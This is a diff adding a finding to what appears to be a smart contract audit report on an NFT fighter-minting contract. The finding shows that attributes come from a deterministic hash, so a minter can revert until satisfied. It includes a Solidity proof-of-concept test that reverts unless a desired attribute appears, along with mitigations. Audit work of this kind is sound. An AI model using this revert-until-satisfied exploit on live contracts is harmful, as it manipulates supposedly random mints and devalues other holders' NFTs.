@@ -73,3 +73,75 @@ In order to mitigate this issue I would modify the design of that function in su
 
 ```  
 This slight modification allows msg.sender to fetch the points of the fighters they specified in the array.
+
+
+## Deterministic minting allows users to revert the transaction if the NFT attributes don't match their expectations
+
+## Vulnerability details
+
+Users can mint an NFT in several ways. Every mint will have physical attribute that will have different rarity, weight and element. The issue here is that if a user isn't pleased with any of these attributes the transaction can be reverted, and he can mint another time, and repeat this process until satisfied.
+
+## Impact
+
+The randomness is bypassed, user can mint desired object, decreasing their value.
+
+## POC
+
+Since the minting process happens in one transaction only, the whole process can be effectively reverted. The abuser can wait for other people to mint a few NFTs, and this will be enough to change the hash that will impact the minting.
+
+```
+            _createNewFighter(
+                msg.sender, 
+     @>         uint256(keccak256(abi.encode(msg.sender, fighters.length))),
+                modelHashes[i], 
+                modelTypes[i],
+                i < numToMint[0] ? 0 : 1, 
+                0,
+                [uint256(100), uint256(100)]
+```
+
+
+```
+        _createNewFighter(
+            to, 
+   @>       uint256(keccak256(abi.encode(msg.sender, fighters.length))), 
+            modelHash, 
+            modelType,
+            0, 
+            0, 
+            customAttributes 
+        );
+```
+
+Here is an actual implementation that an abuser would use:
+
+```solidity 
+ //FighterFarm.t.sol
+
+    function testClaimFightersSelectWhatIwant() public {
+        uint8[2] memory numToMint = [1, 0];
+        bytes memory claimSignature = abi.encodePacked(
+            hex"407c44926b6805cf9755a88022102a9cb21cde80a210bc3ad1db2880f6ea16fa4e1363e7817d5d87e4e64ba29d59aedfb64524620e2180f41ff82ca9edf942d01c"
+        );
+        string[] memory claimModelHashes = new string[](1);
+        claimModelHashes[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
+
+        string[] memory claimModelTypes = new string[](1);
+        claimModelTypes[0] = "original";
+
+        // Right sender of signature should be able to claim fighter
+
+        claimPackage(numToMint, claimSignature, claimModelHashes, claimModelTypes);
+    }
+    function claimPackage(uint8[2] memory numToMint, bytes memory claimSignature, string[] memory claimModelHashes, string[] memory claimModelTypes) public {
+        _fighterFarmContract.claimFighters(numToMint, claimSignature, claimModelHashes, claimModelTypes);
+        ( , ,FighterOps.FighterPhysicalAttributes memory physicalAttributes , , , , , ,) = _fighterFarmContract.fighters(0);
+        uint256 head = physicalAttributes.head;
+        require(head == 1, "head doesn't comply");
+    }
+```
+
+## Mitigation
+
+This issue is not easy to mitigate. I would consider going through a two step minting process, such as mint dna, have a delay, and then mint nft attribute. Although this transaction will still be revertable, it makes it harder to predict the outcomes, but it is still very possible.
+Another more expensive alternative would be to use something like chainlink VRF.
